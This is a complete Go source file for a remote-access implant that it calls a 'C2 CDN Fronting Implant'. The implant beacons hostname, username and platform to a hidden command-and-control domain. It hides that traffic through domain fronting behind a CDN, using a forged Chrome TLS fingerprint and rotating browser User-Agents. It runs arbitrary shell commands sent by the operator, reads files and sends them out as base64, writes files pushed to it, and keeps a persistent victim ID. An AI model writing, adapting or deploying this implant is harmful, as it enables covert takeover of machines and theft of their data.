package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"crypto/tls"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	utls "github.com/refraction-networking/utls"
)

// ============================================================
// Data structures (mirrors the server)
// ============================================================

type Command struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Status  string `json:"status,omitempty"`
	Result  string `json:"result,omitempty"`
}

type BeaconReq struct {
	ClientID string `json:"client_id"`
	Hostname string `json:"hostname,omitempty"`
	Username string `json:"username,omitempty"`
	Platform string `json:"platform,omitempty"`
}

type BeaconResp struct {
	Commands       []Command `json:"commands,omitempty"`
	BeaconInterval int       `json:"beacon_interval,omitempty"`
}

type ResultReq struct {
	ClientID  string `json:"client_id"`
	CommandID string `json:"command_id"`
	Output    string `json:"output"`
	Status    string `json:"status"`
}

// ============================================================
// Globals
// ============================================================

var (
	cdnURL        string // e.g. https://front-cdn.example.com
	frontDomain   string // SNI domain (what the TLS handshake shows)
	c2HostHeader  string // Hidden C2 domain (Host header)
	clientID      string
	beaconInt     = 30 // default seconds between beacons
	clientIDPath  string
	verbose       bool
)

// ============================================================
// ID generation for client persistence
// ============================================================

func loadOrCreateID(path string) string {
	if data, err := os.ReadFile(path); err == nil && len(data) > 0 {
		return strings.TrimSpace(string(data))
	}
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		panic("failed to generate client ID: " + err.Error())
	}
	const hex = "0123456789abcdef"
	out := make([]byte, 16)
	for i, v := range b {
		out[i*2] = hex[v>>4]
		out[i*2+1] = hex[v&0x0f]
	}
	id := string(out)
	os.MkdirAll(dirName(path), 0700)
	os.WriteFile(path, []byte(id+"\n"), 0600)
	return id
}

func dirName(p string) string {
	idx := strings.LastIndex(p, "/")
	if idx == -1 {
		return "."
	}
	return p[:idx]
}

// ============================================================
// uTLS Dialer
// ============================================================

func newUTLSTransport() *http.Transport {
	return &http.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			dialer := &net.Dialer{
				Timeout: 15 * time.Second,
			}
			tcpConn, err := dialer.DialContext(ctx, network, addr)
			if err != nil {
				return nil, fmt.Errorf("tcp dial: %w", err)
			}

			// uTLS config — ServerName is the front domain (SNI)
			config := &utls.Config{
				ServerName:         frontDomain,
				InsecureSkipVerify: false,
				MinVersion:         tls.VersionTLS12,
			}

			// Use Chrome auto fingerprint to mimic a real browser
			uconn := utls.UClient(tcpConn, config, utls.HelloChrome_Auto)
			if err := uconn.HandshakeContext(ctx); err != nil {
				tcpConn.Close()
				return nil, fmt.Errorf("utls handshake: %w", err)
			}

			if verbose {
				state := uconn.ConnectionState()
				fmt.Printf("[*] TLS version: 0x%04X | cipher: %s\n",
					state.Version, tls.CipherSuiteName(state.CipherSuite))
				if len(state.PeerCertificates) > 0 {
					fmt.Printf("[*] Server CN: %s\n", state.PeerCertificates[0].Subject.CommonName)
				}
			}

			return uconn, nil
		},
	}
}

// ============================================================
// HTTP helpers with domain fronting
// ============================================================

func frontedPost(client *http.Client, path string, body interface{}) (*http.Response, error) {
	jsonBody, err := json.Marshal(body)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", cdnURL+path, bytes.NewReader(jsonBody))
	if err != nil {
		return nil, err
	}
	req.Host = c2HostHeader
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", randomUA())

	return client.Do(req)
}

// Return a Chrome-ish User-Agent
func randomUA() string {
	versions := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	}
	// Simple rotation based on time
	return versions[time.Now().Unix()%int64(len(versions))]
}

// ============================================================
// Command execution
// ============================================================

func executeCommand(cmdType, payload string) (string, string) {
	switch cmdType {
	case "exec":
		return execShell(payload)
	case "upload":
		return uploadFile(payload)
	case "download":
		return downloadFile(payload)
	case "config":
		return setConfig(payload)
	default:
		return "", fmt.Sprintf("unknown command type: %s", cmdType)
	}
}

func execShell(cmd string) (string, string) {
	shell := "/bin/sh"
	arg := "-c"
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
		arg = "/C"
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	c := exec.CommandContext(ctx, shell, arg, cmd)
	var stdout, stderr bytes.Buffer
	c.Stdout = &stdout
	c.Stderr = &stderr

	if err := c.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return stdout.String(), "[!] command timed out (30s)"
		}
		return stdout.String(), stderr.String()
	}

	return stdout.String(), stderr.String()
}

func uploadFile(path string) (string, string) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Sprintf("upload error: %v", err)
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	return fmt.Sprintf("file:%s:%s", path, encoded), ""
}

func downloadFile(payload string) (string, string) {
	// payload format: <path> <base64_content>
	parts := strings.SplitN(payload, " ", 2)
	if len(parts) != 2 {
		return "", "download requires: <path> <base64_content>"
	}
	path := parts[0]
	data, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return "", fmt.Sprintf("download decode error: %v", err)
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		return "", fmt.Sprintf("download write error: %v", err)
	}
	return fmt.Sprintf("downloaded %d bytes to %s", len(data), path), ""
}

func setConfig(payload string) (string, string) {
	parts := strings.SplitN(payload, "=", 2)
	if len(parts) != 2 {
		return "", "config requires key=value"
	}
	key := strings.TrimSpace(parts[0])
	val := strings.TrimSpace(parts[1])

	switch key {
	case "beacon_interval":
		v, err := fmt.Sscanf(val, "%d", &beaconInt)
		if err != nil || v != 1 {
			return "", "invalid beacon_interval (expected int seconds)"
		}
		return fmt.Sprintf("beacon_interval set to %ds", beaconInt), ""
	default:
		return "", fmt.Sprintf("unknown config key: %s", key)
	}
}

// ============================================================
// Beacon loop
// ============================================================

func beaconLoop(client *http.Client, wg *sync.WaitGroup, stopCh <-chan struct{}) {
	defer wg.Done()

	backoff := time.Second
	maxBackoff := 60 * time.Second

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	platform := runtime.GOOS + "/" + runtime.GOARCH

	for {
		select {
		case <-stopCh:
			fmt.Println("[*] Shutting down beacon loop")
			return
		default:
		}

		// Beacon
		beaconReq := BeaconReq{
			ClientID: clientID,
			Hostname: hostname,
			Username: username,
			Platform: platform,
		}

		resp, err := frontedPost(client, "/api/v1/beacon", beaconReq)
		if err != nil {
			if verbose {
				fmt.Printf("[-] Beacon failed: %v (backoff %s)\n", err, backoff)
			}
			select {
			case <-stopCh:
				return
			case <-time.After(backoff):
			}
			backoff *= 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			continue
		}

		// Reset backoff on success
		backoff = time.Second

		var beaconResp BeaconResp
		if err := json.NewDecoder(resp.Body).Decode(&beaconResp); err != nil {
			resp.Body.Close()
			continue
		}
		resp.Body.Close()

		// Update beacon interval from server if provided
		if beaconResp.BeaconInterval > 0 {
			beaconInt = beaconResp.BeaconInterval
		}

		// Process commands
		for _, cmd := range beaconResp.Commands {
			if verbose {
				fmt.Printf("[*] Executing command: %s / %s\n", cmd.ID, cmd.Type)
			}

			stdout, stderr := executeCommand(cmd.Type, cmd.Payload)
			output := stdout
			if stderr != "" {
				output = stdout + "\n[STDERR]\n" + stderr
			}
			if output == "" {
				output = "[done]"
			}

			status := "completed"
			if stderr != "" {
				status = "failed"
			}

			resultReq := ResultReq{
				ClientID:  clientID,
				CommandID: cmd.ID,
				Output:    output,
				Status:    status,
			}

			// Send result (best-effort)
			frontedPost(client, "/api/v1/result", resultReq)
		}

		// Sleep until next beacon
		select {
		case <-stopCh:
			return
		case <-time.After(time.Duration(beaconInt) * time.Second):
		}
	}
}

// ============================================================
// Main
// ============================================================

func main() {
	// Config file support for stealth
	var configFile string
	flag.StringVar(&cdnURL, "cdn-url", "", "CDN URL (e.g. https://cdn.example.com)")
	flag.StringVar(&frontDomain, "front-domain", "", "TLS SNI front domain (e.g. www.google.com)")
	flag.StringVar(&c2HostHeader, "c2-host-header", "", "Hidden C2 domain for Host header")
	flag.StringVar(&clientIDPath, "id-file", "", "Path to store persistent client ID")
	flag.IntVar(&beaconInt, "interval", 30, "Beacon interval in seconds")
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose output")
	flag.StringVar(&configFile, "config", "", "Load config from JSON file")
	flag.Parse()

	// Load config from file if specified
	if configFile != "" {
		data, err := os.ReadFile(configFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error reading config: %v\n", err)
			os.Exit(1)
		}
		type fileConfig struct {
			CDNURL       string `json:"cdn_url"`
			FrontDomain  string `json:"front_domain"`
			C2HostHeader string `json:"c2_host_header"`
			ClientID     string `json:"client_id"`
			BeaconInt    int    `json:"beacon_interval"`
			IDFilePath   string `json:"id_file"`
		}
		var fc fileConfig
		if err := json.Unmarshal(data, &fc); err != nil {
			fmt.Fprintf(os.Stderr, "Error parsing config: %v\n", err)
			os.Exit(1)
		}
		if fc.CDNURL != "" {
			cdnURL = fc.CDNURL
		}
		if fc.FrontDomain != "" {
			frontDomain = fc.FrontDomain
		}
		if fc.C2HostHeader != "" {
			c2HostHeader = fc.C2HostHeader
		}
		if fc.ClientID != "" {
			clientIDPath = fc.ClientID
		}
		if fc.IDFilePath != "" {
			clientIDPath = fc.IDFilePath
		}
		if fc.BeaconInt > 0 {
			beaconInt = fc.BeaconInt
		}
	}

	// Validate required flags
	missing := false
	if cdnURL == "" {
		fmt.Fprintln(os.Stderr, "Missing: -cdn-url (e.g. https://front-cdn.cloudflare.com)")
		missing = true
	}
	if frontDomain == "" {
		fmt.Fprintln(os.Stderr, "Missing: -front-domain (e.g. www.google.com)")
		missing = true
	}
	if c2HostHeader == "" {
		fmt.Fprintln(os.Stderr, "Missing: -c2-host-header (e.g. c2.yourhidden.domain)")
		missing = true
	}
	if missing {
		flag.Usage()
		os.Exit(1)
	}

	// Ensure CDN URL has scheme
	if !strings.HasPrefix(cdnURL, "http://") && !strings.HasPrefix(cdnURL, "https://") {
		cdnURL = "https://" + cdnURL
	}

	// Load or create persistent client ID
	if clientIDPath == "" {
		clientIDPath = ".c2-client-id"
	}
	clientID = loadOrCreateID(clientIDPath)

	fmt.Printf("[*] C2 CDN Fronting Implant\n")
	fmt.Printf("[*] Client ID: %s\n", clientID)
	fmt.Printf("[*] CDN URL: %s\n", cdnURL)
	fmt.Printf("[*] Front Domain (SNI): %s\n", frontDomain)
	fmt.Printf("[*] C2 Host Header: %s\n", c2HostHeader)
	fmt.Printf("[*] Beacon interval: %ds\n", beaconInt)

	// Create uTLS transport and HTTP client
	transport := newUTLSTransport()
	httpClient := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	// Handle shutdown
	stopCh := make(chan struct{})
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	var wg sync.WaitGroup
	wg.Add(1)
	go beaconLoop(httpClient, &wg, stopCh)

	// Wait for signal
	<-sigCh
	fmt.Println("\n[*] Received shutdown signal")
	close(stopCh)
	wg.Wait()
	fmt.Println("[*] Implant stopped")
}
